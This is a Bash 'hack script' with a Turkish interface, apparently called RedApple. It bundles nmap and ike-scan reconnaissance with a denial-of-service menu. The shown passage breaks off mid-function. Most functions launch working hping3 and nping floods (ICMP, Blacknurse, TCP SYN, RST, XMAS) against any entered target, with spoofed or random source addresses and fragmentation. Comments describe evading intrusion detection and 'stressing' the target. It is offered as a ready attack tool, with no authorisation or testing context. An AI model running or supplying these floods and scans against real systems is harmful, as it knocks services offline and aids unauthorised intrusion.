#!/bin/bash
#RedApple Çok Opsiyonlu Hack Scripti
#Made by Tarik Esen
PS3="Mod Numarası>"

##MAINMENU##
##################
##START MAINMENU##
mainmenu()
{
#build a main menu using bash select
#from here, the various sub menus can be selected and from them, modules can be run
mainmenu=("Keşfet/Ara" "Saldırı Başlat" "Dosya Yöneticisi" "Yardım ve Hakkında" "Çıkış")
select opt in "${mainmenu[@]}"; do
	if [ "$opt" = "Çıkış" ]; then
	echo "Program Sonlandırılıyor...\nKullandığınız için teşekkür ederiz,yine bekleriz!" && sleep 1 && clear
	exit 0
	elif [ "$opt" = "Keşfet/Ara" ]; then
reconmenu
	elif [ "$opt" = "Saldırı Başlat" ]; then
dosmenu
    elif [ "$opt" = "Dosya Yöneticisi" ]; then
extractionmenu
  	elif [ "$opt" = "Yardım ve Hakkında" ]; then
showreadme
	else
#if no valid option is chosen, chastise the user
	echo "Lütfen Geçerli Bir Mod Seçiniz..Geri Gitmek İçin Enter a Basın"
	fi
done
}
##END MAINMENU##
################
##/MAINMENU##


##RECON##
###################
##START RECONMENU##
reconmenu()
{
#build a menu for the recon modules using bash select
		reconmenu=("IP Adresi Sorgula" "DNS Listesi" "Ping-Sweep Modu" "Hızlı Port Taraması" "Gelişmiş Port Taraması" "UDP Taraması" "Çalışan Sunucuları Kontrol Et" "IP Güvenlik Taraması" "Geri")
	select reconopt in "${reconmenu[@]}"; do
#show external IP & interface IP(s)
	if [ "$reconopt" = "IP Adresi Sorgula" ]; then
		showip
#DNS Recon
    elif [ "$reconopt" = "DNS Listesi" ]; then
        dnsrecon
#Ping Sweep
    elif [ "$reconopt" = "Ping-Sweep Modu" ]; then
        pingsweep
#Recon Network
    elif [ "$reconopt" = "Hızlı Port Taraması" ]; then
        quickscan
#Stealth Scan
    elif [ "$reconopt" = "Gelişmiş Port Taraması" ]; then
        detailedscan
#UDP Scan
	elif [ "$reconopt" = "UDP Taraması" ]; then
		udpscan
#Check uptime of server
    elif [ "$reconopt" = "Çalışan Sunucuları Kontrol Et" ]; then
        checkuptime
#IPsec Scan
	elif [ "$reconopt" = "IP Güvenlik Taraması" ]; then
		ipsecscan
#Go back
	elif [ "$reconopt" = "Geri" ]; then
		mainmenu
## Default if no menu option selected is to return an error
	else
  		echo  "Lütfen Geçerli Bir Mod Seçiniz..Geri Gitmek İçin Enter a Basın"
	fi
	done
}
##END RECONMENU##
#################

################
##START SHOWIP##
showip()
{		echo "Bilgisayar Statik IP Adresi Aranıyor..."
		echo "IP Adresiniz:"
#use curl to lookup external IP
		curl https://canihazip.com/s/
		echo ""
		echo ""
#show interface IP's
		echo "Arayüz IPniz:"
		ip a|grep inet
#if ip a command fails revert to ifconfig
	if ! [[ $? = 0 ]]; then
		ifconfig|grep inet
	fi
		echo ""
}
##END SHOWIP##
##############

##################
##START DNSRECON##
dnsrecon()
{ echo "UYARI:Bu modül önceki/sonraki isimleri listeler ve pasif biçimde çalışır"
	echo "Hedef DNS:"
#need a target IP/hostname to check
	read -i $TARGET -e TARGET
host $TARGET
#if host command doesnt work try nslookup instead
if ! [[ $? = 0 ]]; then
nslookup $TARGET
fi
#run a whois lookup on the target
sleep 1 && whois -H $TARGET
if ! [[ $? = 0 ]]; then
#if whois fails, do a curl lookup to ipinfo.io
sleep 1 && curl ipinfo.io/$TARGET
fi
}
##END DNSRECON##
################

###################
##START PINGSWEEP##
pingsweep()
{ echo "Ping-Sweep Modu(Bu Mod Ek Bir Yazılım İçermemektedir)"
	echo "Lütfen Hedef IP Adresini Giriniz (örn. 192.168.1.0/24):"
#need to know the subnet to scan for live hosts using pings
	read -i $TARGET -e TARGET
#launch ping sweep using nmap
#this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
sudo nmap -sP -PE $TARGET --reason
}
##END PINGSWEEP##
#################

######################
##START QUICKSCAN##
quickscan()
{ echo "Bu Modül nmap Yardımı ile Tarama Gerçekleştirir"
echo "Yaygın Ve Açık Portlar Listelenmede Öncelikli Olacaktır"
echo "En Yaygın Portlar da Dahil 1000 e Yakın Portta Tarama Yapılacak"
echo "Hedef Belirleme Aktif Hale Getiriliyor..."
echo "Lütfen Tarama İçin Bir Host Adı,IP veya Subnet Adresi Giriniz:"
#we need to know where to scan.  Whilst a hostname is possible, this module is designed to scan a subnet range
read -i $TARGET -e TARGET
echo "Lütfen Tarama Sıklığını Giriniz (Minimum 0,Maksimum 5 e Kadar Değer Girilebilir)
UYARI:Tarama Sıklığı Ne Kadar Az İse O Kadar Detaylı,Ne Kadar Fazla İse O Kadar Hızlı Tarama Gerçekleşecektir.
Varsayılan Sıklık=3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan
sudo nmap -Pn -sS -T $SPEED $TARGET --reason
}
## END QUICKSCAN##
#####################

#####################
##START DETAILEDSCAN##
detailedscan()
{ echo "Bu Modül nmap Yardımı ile Tarama Gerçekleştirir"
echo "Bu Tarama Sanal Ağlarda Kullanılabilme İhtimali Olan Tüm Portları Listeleyen Uzun Ve Detaylı Bir Taramadır"
echo "Bu Modül Detaylı Bir Tarama Gerçekleştirir ve Servis Bilgileri-OS Tespiti Dahil Tüm Portları Listeler"
echo "Tarama Ciddi Anlamda Uzun Sürebilir...Sabırlı Olun :)"
echo "Lütfen Tarama İçin Bir Host Adı,IP veya Subnet Adresi Giriniz:"
#need a target hostname/IP
read -i $TARGET -e TARGET
echo "Lütfen Tarama Sıklığını Giriniz (Minimum 0,Maksimum 5 e Kadar Değer Girilebilir)
UYARI:Tarama Sıklığı Ne Kadar Az İse O Kadar Detaylı,Ne Kadar Fazla İse O Kadar Hızlı Tarama Gerçekleşecektir.
Varsayılan Sıklık=3:"
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
read -i $SPEED -e SPEED
: ${SPEED:=3}
#scan using nmap.  Note the change in user-agent from the default nmap value to help avoid detection
sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" -Pn -p 1-65535 -sV -sC -A -O -T $SPEED $TARGET --reason
}
##END DETAILEDSCAN##
###################

#################
##START UDPSCAN##
udpscan()
{ echo "Bu Modül Açık Olan UDP Portlarını Listeler"
echo "Bu Tarama Hedef Sistemdeki Tüm UDP Portlarını Kapsar,Taramanın Tamamlanması Uzun Sürebilir,Sabırlı Olun"
echo "Taramak İçin Lütfen Hedef Host Adı,IP veya Subnet Adresi Giriniz:"
#need a target IP/hostname
read -i $TARGET -e TARGET
#How fast should we scan the target?
#Faster speed is more likely to be detected by IDS, but is less waiting around
echo "Lütfen Tarama Sıklığını Giriniz (Minimum 0,Maksimum 5 e Kadar Değer Girilebilir)
UYARI:Tarama Sıklığı Ne Kadar Az İse O Kadar Detaylı,Ne Kadar Fazla İse O Kadar Hızlı Tarama Gerçekleşecektir.
Varsayılan Sıklık=3:"
read -i $SPEED -e SPEED
: ${SPEED:=3}
#launch the scan using nmap
sudo nmap -Pn -p 1-65535 -sU -T $SPEED $TARGET --reason
}
##END UDPSCAN##
###############

#####################
##START CHECKUPTIME##
checkuptime()
{ echo "Bu Modül hping3 Yardımıyla Hedef Bilgisayarda Çalışmakta Olan Aktif Sunucuları Listeler"
  echo "Kesin Çalışma Garantisi Yoktur"
  echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
  read -i $TARGET -e TARGET
#need a target port
  echo "Port Giriniz(Varsayılan:80):"
  read -i $PORT -e PORT
  : ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor..."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Değeri Seçildi,Port 80 Olarak Ayarlanıyor..."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! Port 80 Olarak Ayarlanıyor..."
	else echo "Using Port $PORT"
	fi
#how many times to retry the check?
  echo "Bu Kontrolün Kaç Defa Tekrarlanmasını İstiyorsunuz?(İdeal Değer:3)"
  read -i $RETRY -e RETRY
  : ${RETRY:=3}
  echo "Başlatılıyor..."
#use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
#this might not work, but sometimes it does work very well
  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
  echo "İşlem Tamamlandı"
}
##END CHECKUPTIME##
###################

####################
##START IPSEC SCAN##
ipsecscan()
{ echo "Lütfen Host Adı veya IP Giriniz:"
#we need to know where to scan
read -i $TARGET -e TARGET
# Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
ENCLIST="1 5 7/128 7/192 7/256"
# Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
HASHLIST="1 2 4 5 6"
# Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
AUTHLIST="1 3 64221 65001"
# Diffie-Hellman groups: 1, 2, 5 and 12
GROUPLIST="1 2 5 12"
for ENC in $ENCLIST; do
   for HASH in $HASHLIST; do
      for AUTH in $AUTHLIST; do
         for GROUP in $GROUPLIST; do
          sudo echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | sudo xargs --max-lines=8 ike-scan --retry=1 -R -M $TARGET | grep -v "Starting" | grep -v "0 returned handshake; 0 Geri Bildirim:AES186"
         done
      done
   done
done
}
##END IPSECSCAN##
#################
##/RECON##
#############


##DOS##
#################
##START DOSMENU##
dosmenu()
{
#display a menu for the DOS module using bash select
		dosmenu=("ICMP Echo Ping Saldırısı" "Blacknurse Dos Saldırısı" "TCP SYN Flood Saldırısı" "TCP RST Flood Saldırısı" "TCP XMAS Flood Saldırısı" "UDP Flood Saldırısı" "SSL DOS Saldırısı" "Slowloris Saldırısı" "IPsec DOS Saldırısı" "Geciktirme Taraması" "DNS NXDOMAIN Flood Saldırısı" "Geri")
	select dosopt in "${dosmenu[@]}"; do
#ICMP Echo Flood
	if [ "$dosopt" = "ICMP Echo Ping Saldırısı" ]; then
		icmpflood
#ICMP Blacknurse
	elif [ "$dosopt" = "Blacknurse Dos Saldırısı" ]; then
		blacknurse
#TCP SYN Flood DOS
 	elif [ "$dosopt" = "TCP SYN Flood Saldırısı" ]; then
		synflood
#TCP RST Flood
	elif [ "$dosopt" = "TCP RST Flood Saldırısı" ]; then
		rstflood
#TCP XMAS Flood
	elif [ "$dosopt" = "TCP XMAS Flood Saldırısı" ]; then
		xmasflood
#UDP Flood
 	elif [ "$dosopt" = "UDP Flood Saldırısı" ]; then
		udpflood
#SSL DOS
	elif [ "$dosopt" = "SSL DOS Saldırısı" ]; then
		ssldos
#Slowloris
	elif [ "$dosopt" = "Slowloris Saldırısı" ]; then
		slowloris
#IPsec DOS
	elif [ "$dosopt" = "IPsec DOS Saldırısı" ]; then
		ipsecdos
#Distraction scan
	elif [ "$dosopt" = "Geciktirme Taraması" ]; then
		distractionscan
#DNS NXDOMAIN Flood
	elif [ "$dosopt" = "DNS NXDOMAIN Flood Saldırısı" ]; then
		nxdomainflood
#Go back
	elif [ "$dosopt" = "Geri" ]; then
		mainmenu
	else
#Default if no valid menu option selected is to return an error
  	echo  "Lütfen Geçerli Bir Mod Seçiniz..Geri Gitmek İçin Enter a Basın"
	fi
done
}
##END DOSMENU##
###############

###################
##START ICMPFLOOD##
icmpflood()
{
		echo "hping3 ile ICMP Echo Ping Saldırısı Hazırlanıyor..."
		echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "ICMP Echo Ping Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "ICMP Echo Ping Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "ICMP Echo Ping Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 --flood $TARGET
	else echo "Geçerli Bir Opsiyon Değil ! Arayüz IP Kullanılıyor.."
		echo "ICMP Echo Ping Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 --flood $TARGET
	fi
}
##END ICMPFLOOD##
#################	

####################
##START BLACKNURSE##
blacknurse()
{		
		echo "hping3 ile Blacknurse Dos Saldırısı Hazırlanılıyor.."
		echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
		read -i $TARGET -e TARGET
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Blacknurse Dos Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 -C 3 -K 3 --flood --spoof $SOURCE $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Blacknurse Dos Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Blacknurse Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	else echo "Geçerli Bir Opsiyon Değil ! Arayüz IP Kullanılıyor.."
		echo "Blacknurse Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -1 -C 3 -K 3 --flood $TARGET
	fi
}
##END BLACKNURSE##
##################


#####################
##START TCPSYNFLOOD##
synflood()
{		echo "hping3 ile TCP SYN Flood Saldırısı Hazırlanıyor.."
	if test -f "/usr/sbin/hping3"; then echo "hping3 Bulundu! Yükleniyor...";
#hping3 is found, so use that for TCP SYN Flood
		echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
		echo "Hedef Portu Giriniz(Varsayılan:80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Using Port $PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the SYN packet?  Default is to send no data
	echo "Veriyi SYN Paket İstemi İle Göndermek İster Misiniz?(e)vet (h)ayır(varsayılan):"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=h}
	if [[ $SENDDATA = e ]]; then
#we've chosen to send data, so how much should we send?
	echo "Lütfen Göndermek İstediğiniz Verinin Büyüklüğünü Ayarlayın(Bayt)(Varsayılan=3000 Bayt):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Yanlış Değer ! Varsayılan Büyüklük Kullanılıyor..."
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP SYN flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "TCP SYN Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "TCP SYN Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "TCP SYN Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Geçerli Bir Opsiyon Değil ! Arayüz IP Kullanılıyor.."
		echo "TCP SYN Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
#No hping3 so using nping for TCP SYN Flood
	else echo "hping3 Araştırılıyor..."
		echo "hping3 Bulunamadı ! Alternatif Olarak nping Kullanılacak..."
		echo "nping ile TCP SYN Flood Saldırısı Hazırlanıyor..(UYARI:Çalışma İhtimali hping3 e Göre Daha Zayıftır)"
#need a valid target ip/hostname
		echo "Hedef IP veya Host Adı Giriniz:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Hedef Portu Giriniz(Varsayılan:80):"
	read -i $PORT -e PORT
		: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#define source IP or use outgoing interface IP
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Saniyede Gönderilecek Veri Sayısını Seçin(Varsayılan=10000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Gönderilecek Toplam Veri Sayısını Seçin(Varsayılan=100000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "TCP SYN Flood Saldırısı Aktif..."
#begin TCP SYN flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPSYNFLOOD##
###################

#####################
##START TCPRSTFLOOD##
rstflood()
{		echo "hping3 ile TCP RST Flood Saldırısı Hazırlanıyor..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 Bulundu ! Yükleniyor...";
#hping3 is found, so use that for TCP RST Flood
		echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP RST packets to
		echo "Hedef Portu Giriniz(Varsayılan:80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the RST packet?  Default is to send no data
	echo "Veriyi RST Paket İstemcisi ile Göndermek İster Misiniz? (e)vet (h)ayır(Varsayılan):"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=h}
	if [[ $SENDDATA = e ]]; then
#we've chosen to send data, so how much should we send?
	echo "Lütfen Göndermek İstediğiniz Verinin Büyüklüğünü Ayarlayın(Bayt)(Varsayılan=3000 Bayt):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Yanlış Değer ! Varsayılan Büyüklük Kullanılıyor..."
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP RST flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "TCP RST Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "TCP RST Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "TCP RST Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
	else echo "Geçerli Bir Opsiyon Değil ! Arayüz IP Kullanılıyor.."
		echo "TCP RST Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 Bulunamadı ! Alternatif Olarak nping Kullanılacak..."
		echo ""
		echo "nping ile TCP SYN Flood Saldırısı Hazırlanıyor..(UYARI:Çalışma İhtimali hping3 e Göre Daha Zayıftır)"
#need a valid target ip/hostname
		echo "Hedef IP veya Host Adı Giriniz"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Hedef Portu Giriniz(Varsayılan:80)"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#define source IP or use outgoing interface IP
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Saniyede Gönderilecek Veri Sayısını Seçin(Varsayılan=10000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo "Gönderilecek Toplam Veri Sayısını Seçin(Varsayılan=100000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "TCP RST Flood Saldırısı Aktif..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END TCPRSTFLOOD##
###################

#####################
##START TCPXMASFLOOD##
xmasflood()
{		echo "hping3 ile TCP XMAS Flood Saldırısı Hazırlanıyor..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 Bulundu ! Yükleniyor...";
#hping3 is found, so use that for TCP XMAS Flood
		echo "Hedef IP veya Host Adı Giriniz:"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP XMAS packets to
		echo "Hedef Portu Giriniz(Varsayılan:80)"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın) veya IP Giriniz:"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#should any data be sent with the XMAS packet?  Default is to send no data
	echo "Veriyi XMAS Paket İstemcisi ile Göndermek İster Misiniz? (e)vet (h)ayır(Varsayılan):"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?
	echo "Lütfen Göndermek İstediğiniz Verinin Büyüklüğünü Ayarlayın(Bayt)(Varsayılan=3000 Bayt):"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Yanlış Değer ! Varsayılan Büyüklük Kullanılıyor..."
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0
	fi
#start TCP XMAS flood using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "TCP XMAS Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "TCP XMAS Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA --rand-source -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "TCP XMAS Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 -d $DATA --flood -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	else echo "Geçerli Bir Opsiyon Değil ! Arayüz IP Kullanılıyor.."
		echo "TCP XMAS Flood Saldırısı Aktif..İşlemi Durdurmak Ve Ana Menüye Dönmek İçin Ctrl+C Yapınız"
		sudo hping3 --flood -d $DATA -p $PORT -F -S -R -P -A -U -X -Y $TARGET
	fi
#No hping3 so using nping for TCP XMAS Flood
	else echo "hping3 Bulunamadı ! Alternatif Olarak nping Kullanılacak..."
		echo ""
		echo "nping ile TCP XMAS Flood Saldırısı Hazırlanıyor..(UYARI:Çalışma İhtimali hping3 e Göre Daha Zayıftır)"
#need a valid target ip/hostname
		echo "Hedef IP veya Host Adı Giriniz:"
	read -i $TARGET -e TARGET
#need a valid target port
		echo "Hedef Portu Giriniz(Varsayılan:80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Geçerli Bir Port Değeri Girilmedi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Yanlış Bir Port Seçildi,Port 80 Olarak Ayarlanıyor.."
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Port Geçersiz ! 80 Olarak Ayarlanıyor.."
	else echo "Port Kullanılıyor:$PORT"
	fi
#define source IP or use outgoing interface IP
		echo "IP Tipini Seçiniz(Rastgele için r Arayüz için ise i yi tuşlayın)"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo "Saniyede Gönderilecek Veri Sayısını Seçin(Varsayılan=10000):"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
